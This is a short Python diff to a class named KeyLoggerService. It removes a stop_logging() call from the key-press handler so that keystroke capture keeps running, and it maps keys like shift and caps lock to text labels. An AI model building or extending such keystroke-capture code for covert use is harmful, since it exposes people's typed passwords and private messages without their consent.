@@ -13,8 +13,6 @@ class KeyLoggerService(IKeyLogger):
 
     def on_press(self, key):
         self.key_str = str(key).replace("'", "")
-        self.stop_logging()
-
         if self.key_str=='Key.shift':
             self.key_str=' [shift] '
         if self.key_str=="Key.caps_lock":
